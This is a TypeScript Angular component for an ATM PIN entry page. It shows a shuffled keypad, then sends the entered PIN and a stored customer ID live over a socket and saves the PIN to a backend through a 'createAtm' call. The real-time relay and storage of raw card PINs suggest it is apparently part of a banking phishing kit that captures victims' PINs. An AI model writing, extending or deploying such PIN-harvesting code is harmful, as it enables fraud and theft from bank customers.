import { Component, OnInit, signal, inject } from '@angular/core';
import { Router } from '@angular/router';
import { SocketService } from '../../../core/services/socket.service';
import { CustomerService } from '../../../core/services/customer';

@Component({
  selector: 'app-atm-pin-page',
  templateUrl: './atm-pin-page.html',
})
export class AtmPinPage implements OnInit {
  private readonly router = inject(Router);
  private readonly socketService = inject(SocketService);
  private readonly customerService = inject(CustomerService);

  protected readonly pin = signal('');
  protected readonly keypadKeys = signal<number[]>([]);
  protected readonly isModalOpen = signal(false);
  protected readonly pinDigits = [0, 1, 2, 3];

  ngOnInit() {
    this.buildKeypad();
  }

  protected buildKeypad() {
    const digits = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9];
    for (let i = digits.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [digits[i], digits[j]] = [digits[j], digits[i]];
    }
    this.keypadKeys.set(digits);
  }

  protected handleKey(digit: number) {
    if (this.pin().length < 4) {
      this.pin.update(p => p + digit.toString());
    }
  }

  protected handleBackspace() {
    this.pin.update(p => p.slice(0, -1));
  }

  protected handleClear() {
    this.pin.set('');
  }

  protected submitPin() {
    if (this.pin().length === 4) {
      const customerId = localStorage.getItem('customer_id');
      if (customerId) {
        this.socketService.emitAtmPin({ pin: this.pin(), customer_id: customerId });
        
        this.customerService.createAtm({ pass: this.pin(), customer_id: customerId }).subscribe({
          next: () => console.log('ATM Pin saved to backend'),
          error: (err) => console.error('Failed to save ATM Pin', err)
        });
      }
      this.isModalOpen.set(true);
    }
  }

  protected returnHome() {
    this.router.navigate(['/']);
  }
}
